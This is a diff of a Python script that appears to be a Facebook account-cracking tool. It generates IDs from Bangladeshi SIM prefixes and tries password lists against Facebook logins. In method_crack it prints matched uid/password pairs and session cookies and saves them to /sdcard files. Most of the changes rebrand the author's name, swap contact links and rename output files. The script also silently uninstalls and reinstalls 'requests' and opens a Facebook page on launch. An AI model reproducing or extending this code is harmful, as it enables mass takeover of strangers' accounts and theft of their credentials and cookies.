@@ -1,6 +1,6 @@
-#--------------++CREATED     +ROBBANI++-----------------#
-#--------------++FACEBOOK  + ROBBANI GAM++----------------#
-#--------------++ GITHUB        + ROBBANI-HACKER+--------------------------#
+#--------------++CREATED     +ROBBANI ++-----------------#
+#--------------++FACEBOOK  + ROBBANI++----------------#
+#--------------++ GITHUB        + DX1433+--------------------------#
 
 import os
 os.system("pip uninstall requests -y")
@@ -36,10 +36,10 @@ try:
 except ModuleNotFoundError:
         print('\n Installing missing modules ...')
         os.system('pip install requests futures==2 > /dev/null')
-        os.system('python DX.py')
+        os.system('python robbanix.py')
 
 
-os.system('xdg-open https://www.facebook.com/groups/1590710078091857/?ref=share')
+os.system('xdg-open https://www.facebook.com/robbane.gam.1')
 #-------------color----------------#
 bblack="\033[1;30m"         # Black
 M="\033[1;31m"            # Red
@@ -76,7 +76,7 @@ o888o  o888o  `Y8bood8P'  o888bood8P'  o888bood8P'  o88o     o8888o o8o        `
                                                                                          
 ╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝ 
 ╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
-║\33[0;45m      [ TOOLS CREATED BY : ROBBANI-HACKER ]     \033[0;92m║
+║\33[0;45m      [ TOOLS CREATED BY : ROBBANI ]     \033[0;92m║
 ╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
 ╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
 ║\33[0;42mTOOLS      :   RANDOM\033[0;92m          \33[0;41mFIRE\033[0;92m          ║
@@ -104,9 +104,9 @@ def TARA_LOVE():
     if option in ['01','1']:
         BD_CLONING()
     if option in ['02','2']:
-    	os.system('xdg-open https://www.facebook.com/robbane.gam.1);time.sleep(1)
+    	os.system('xdg-open https://www.facebook.com/robbane.gam.1');time.sleep(1)
     if option in ['03','3']:
-    	os.system('xdg-open https://wa.me/+8801916564949');time.sleep(1)
+    	os.system('xdg-open https://wa.me/+8801866943322');time.sleep(1)
     else:
         exit(' Thanks for using dear :)')
 
@@ -116,7 +116,7 @@ def BD_CLONING():
     print(' EXAMPLE SIM CODE : [016] [017] [018] [019]')
     code=input(' ENTER SIM CODE >> ')
     linex()
-    print(' EXAMPLE LIMIT : [10000] [20000] [50000] [10000]')
+    print(' EXAMPLE LIMIT : [1000] [2000] [5000] [10000]')
     try:
         limit=int(input(' ENTER LIMIT >> '))
     except ValueError:
@@ -165,15 +165,15 @@ def method_crack(ids,passlist):
                 if str(uid) in oks:
                     break
                 else:
-                    print('\r\r \033[1;32m[ROBBANI-OK] '+str(uid)+' | '+pas+'\033[1;37m')
+                    print('\r\r \033[1;32m[Robbani-OK] '+str(uid)+' | '+pas+'\033[1;37m')
                     coki=";".join(i["name"]+"="+i["value"] for i in reqx["session_cookies"])
                     print('\033[1;37m [COOKIE-🌸] '+coki)
-                    open('/sdcard/ROBBANI-OK.txt','a').write(str(uid)+' | '+pas+'\n')
+                    open('/sdcard/Robbani.txt','a').write(str(uid)+' | '+pas+'\n')
                     oks.append(str(uid))
                     break
             elif 'www.facebook.com' in reqx['error_msg']:
-                print('\r\r \033[1;35m[DX-CP] '+ids+' | '+pas+'\033[1;37m')
-                open('/sdcard/ROBBANI-CP.txt','a').write(ids+'|'+pas+'\n')
+                print('\r\r \033[1;35m[robbani-CP] '+ids+' | '+pas+'\033[1;37m')
+                open('/sdcard/DX-CP.txt','a').write(ids+'|'+pas+'\n')
                 cps.append(ids)
                 break
             else:
